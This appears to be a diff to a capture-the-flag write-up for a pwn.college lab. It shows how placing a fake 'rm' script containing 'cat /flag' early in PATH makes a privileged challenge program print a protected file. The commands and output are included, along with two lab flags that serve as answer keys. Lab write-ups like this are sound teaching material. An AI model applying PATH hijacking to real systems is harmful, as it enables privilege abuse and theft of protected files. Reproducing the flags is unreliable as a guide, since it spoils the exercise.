@@ -52,5 +52,16 @@ pwn.college{00-uQ0LjDyL28VFunAAJmvsKasY.dZzNyUDLwQDO0czW}
 
 ***4.Hijacking Commands***
 
-```
+In this challenge, the flag will be deleted using the rm command so I created an empty file named rm, which will be invoked instead of the flag. I stored ```cat /flag``` in the rm file. I further, changed the permissions of the file to give executive access to everyone. This way when I ran the command ```/challenge/run```, I got the flag.
 
+```
+Connected!
+hacker@path~hijacking-commands:~$ touch rm
+hacker@path~hijacking-commands:~$ echo 'cat /flag'>rm
+hacker@path~hijacking-commands:~$ PATH="/home/hacker:$PATH"
+hacker@path~hijacking-commands:~$ chmod a+x rm
+hacker@path~hijacking-commands:~$ /challenge/run
+Trying to remove /flag...
+Found 'rm' command at /home/hacker/rm. Executing!
+pwn.college{sSx13YbrNXaInGgkr8K9gtURFT5.ddzNyUDLwQDO0czW}
+```
